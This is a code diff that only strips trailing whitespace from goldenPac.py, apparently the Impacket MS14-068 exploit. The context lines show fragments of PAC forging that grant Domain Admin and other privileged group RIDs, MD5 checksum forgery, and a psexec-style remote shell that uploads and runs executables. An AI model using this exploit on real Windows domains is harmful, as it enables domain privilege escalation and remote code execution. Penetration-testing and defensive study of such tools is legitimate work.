@@ -131,7 +131,7 @@ class PSEXEC:
                     logging.critical(str(e))
                     sys.exit(1)
                 installService = serviceinstall.ServiceInstall(rpctransport.get_smb_connection(), f)
-    
+
             installService.install()
 
             if self.__exeFile is not None:
@@ -176,7 +176,7 @@ class PSEXEC:
                                            r'\%s%s%d' % (RemComSTDERR, packet['Machine'], packet['ProcessID']),
                                            smb.FILE_READ_DATA)
             stderr_pipe.start()
-            
+
             # And we stay here till the end
             ans = s.readNamedPipe(tid,fid_main,8)
 
@@ -246,7 +246,7 @@ class Pipes(Thread):
             user, passwd, domain, lm, nt, aesKey, TGT, TGS = self.credentials
             self.server.login(user, passwd, domain, lm, nt)
             lock.release()
-            self.tid = self.server.connectTree('IPC$') 
+            self.tid = self.server.connectTree('IPC$')
 
             self.server.waitNamedPipe(self.tid, self.pipe)
             self.fid = self.server.openFile(self.tid,self.pipe,self.permissions, creationOption = 0x40, fileAttributes = 0x80)
@@ -275,7 +275,7 @@ class RemoteStdOutPipe(Pipes):
                         else:
                             # Don't echo what I sent, and clear it up
                             LastDataSent = ''
-                        # Just in case this got out of sync, i'm cleaning it up if there are more than 10 chars, 
+                        # Just in case this got out of sync, i'm cleaning it up if there are more than 10 chars,
                         # it will give false positives tho.. we should find a better way to handle this.
                         if LastDataSent > 10:
                             LastDataSent = ''
@@ -325,7 +325,7 @@ class RemoteShell(cmd.Cmd):
  lcd {path}                 - changes the current local directory to {path}
  exit                       - terminates the server process (and this session)
  put {src_file, dst_path}   - uploads a local file to the dst_path RELATIVE to the connected share (%s)
- get {file}                 - downloads pathname RELATIVE to the connected share (%s) to the current local dir 
+ get {file}                 - downloads pathname RELATIVE to the connected share (%s) to the current local dir
  ! {cmd}                    - executes a local shell cmd
 """ % (self.share, self.share))
         self.send_data('\r\n', False)
@@ -350,7 +350,7 @@ class RemoteShell(cmd.Cmd):
             pass
 
         self.send_data('\r\n')
- 
+
     def do_put(self, s):
         try:
             if self.transferClient is None:
@@ -467,21 +467,21 @@ class MS14_068:
         kerbdata['LogonTime']['dwLowDateTime']           = unixTime & 0xffffffff
         kerbdata['LogonTime']['dwHighDateTime']          = unixTime >>32
 
-        # LogoffTime: A FILETIME structure that contains the time the client's logon 
-        # session should expire. If the session should not expire, this structure 
-        # SHOULD have the dwHighDateTime member set to 0x7FFFFFFF and the dwLowDateTime 
-        # member set to 0xFFFFFFFF. A recipient of the PAC SHOULD<7> use this value as 
+        # LogoffTime: A FILETIME structure that contains the time the client's logon
+        # session should expire. If the session should not expire, this structure
+        # SHOULD have the dwHighDateTime member set to 0x7FFFFFFF and the dwLowDateTime
+        # member set to 0xFFFFFFFF. A recipient of the PAC SHOULD<7> use this value as
         # an indicator of when to warn the user that the allowed time is due to expire.
         kerbdata['LogoffTime']['dwLowDateTime']          = 0xFFFFFFFF
         kerbdata['LogoffTime']['dwHighDateTime']         = 0x7FFFFFFF
 
-        # KickOffTime: A FILETIME structure that contains LogoffTime minus the user 
-        # account's forceLogoff attribute ([MS-ADA1] section 2.233) value. If the 
-        # client should not be logged off, this structure SHOULD have the dwHighDateTime 
-        # member set to 0x7FFFFFFF and the dwLowDateTime member set to 0xFFFFFFFF. 
-        # The Kerberos service ticket end time is a replacement for KickOffTime. 
-        # The service ticket lifetime SHOULD NOT be set longer than the KickOffTime of 
-        # an account. A recipient of the PAC SHOULD<8> use this value as the indicator 
+        # KickOffTime: A FILETIME structure that contains LogoffTime minus the user
+        # account's forceLogoff attribute ([MS-ADA1] section 2.233) value. If the
+        # client should not be logged off, this structure SHOULD have the dwHighDateTime
+        # member set to 0x7FFFFFFF and the dwLowDateTime member set to 0xFFFFFFFF.
+        # The Kerberos service ticket end time is a replacement for KickOffTime.
+        # The service ticket lifetime SHOULD NOT be set longer than the KickOffTime of
+        # an account. A recipient of the PAC SHOULD<8> use this value as the indicator
         # of when the client should be forcibly disconnected.
         kerbdata['KickOffTime']['dwLowDateTime']         = 0xFFFFFFFF
         kerbdata['KickOffTime']['dwHighDateTime']        = 0x7FFFFFFF
@@ -491,10 +491,10 @@ class MS14_068:
 
         kerbdata['PasswordCanChange']['dwLowDateTime']   = 0
         kerbdata['PasswordCanChange']['dwHighDateTime']  = 0
-        
+
         # PasswordMustChange: A FILETIME structure that contains the time at which
-        # theclient's password expires. If the password will not expire, this 
-        # structure MUST have the dwHighDateTime member set to 0x7FFFFFFF and the 
+        # theclient's password expires. If the password will not expire, this
+        # structure MUST have the dwHighDateTime member set to 0x7FFFFFFF and the
         # dwLowDateTime member set to 0xFFFFFFFF.
         kerbdata['PasswordMustChange']['dwLowDateTime']  = 0xFFFFFFFF
         kerbdata['PasswordMustChange']['dwHighDateTime'] = 0x7FFFFFFF
@@ -509,7 +509,7 @@ class MS14_068:
         kerbdata['BadPasswordCount']   = 0
         kerbdata['UserId']             = self.__rid
         kerbdata['PrimaryGroupId']     = 513
-        
+
         # Our Golden Well-known groups! :)
         groups = (513, 512, 520, 518, 519)
         kerbdata['GroupCount']         = len(groups)
@@ -537,7 +537,7 @@ class MS14_068:
         kerbdata['FailedILogonCount'] = 0
         kerbdata['Reserved3']         = 0
 
-        # AUTHENTICATION_AUTHORITY_ASSERTED_IDENTITY: A SID that means the client's identity is 
+        # AUTHENTICATION_AUTHORITY_ASSERTED_IDENTITY: A SID that means the client's identity is
         # asserted by an authentication authority based on proof of possession of client credentials.
         #extraSids = ('S-1-18-1',)
         if self.__forestSid is not None:
@@ -547,7 +547,7 @@ class MS14_068:
         else:
             extraSids = ()
             kerbdata['SidCount']          = len(extraSids)
-        
+
         for extraSid in extraSids:
             sidRecord = KERB_SID_AND_ATTRIBUTES()
             sid = RPC_SID()
@@ -559,7 +559,7 @@ class MS14_068:
         kerbdata['ResourceGroupDomainSid'] = NULL
         kerbdata['ResourceGroupCount'] = 0
         kerbdata['ResourceGroupIds'] = NULL
-            
+
         validationInfo = self.VALIDATION_INFO()
         validationInfo['Data'] = kerbdata
 
@@ -672,7 +672,7 @@ class MS14_068:
 
         # If you want to do MD5, ucomment this
         serverChecksum['Signature'] = MD5.new(blobToChecksum).digest()
-        privSvrChecksum['Signature'] = MD5.new(serverChecksum['Signature']).digest() 
+        privSvrChecksum['Signature'] = MD5.new(serverChecksum['Signature']).digest()
 
         buffersTail = serverChecksum.getData() + serverChecksumAlignment + privSvrChecksum.getData() + privSvrChecksumAlignment
         pacType['Buffers'] = buffers + buffersTail
@@ -744,7 +744,7 @@ class MS14_068:
 
         seq_set(authenticator, 'cname', clientName.components_to_asn1)
 
-        now = datetime.datetime.utcnow() 
+        now = datetime.datetime.utcnow()
         authenticator['cusec'] =  now.microsecond
         authenticator['ctime'] = KerberosTime.to_asn1(now)
 
@@ -793,7 +793,7 @@ class MS14_068:
         encTGSRepPart = decoder.decode(plainText, asn1Spec = EncTGSRepPart())[0]
 
         newSessionKey = Key(cipher.enctype, encTGSRepPart['key']['keyvalue'].asOctets())
-    
+
         return r, cipher, sessionKey, newSessionKey
 
     def getForestSid(self):
@@ -1107,7 +1107,7 @@ if __name__ == '__main__':
         print("\tThis will upload the xxx.exe file and execute it as: xxx.exe param1 param2 paramn")
         print("\tpython goldenPac.py -c xxx.exe domain.net/normaluser:mypwd@domain-host param1 param2 paramn\n")
         sys.exit(1)
- 
+
     options = parser.parse_args()
 
     # Init the example's logger theme
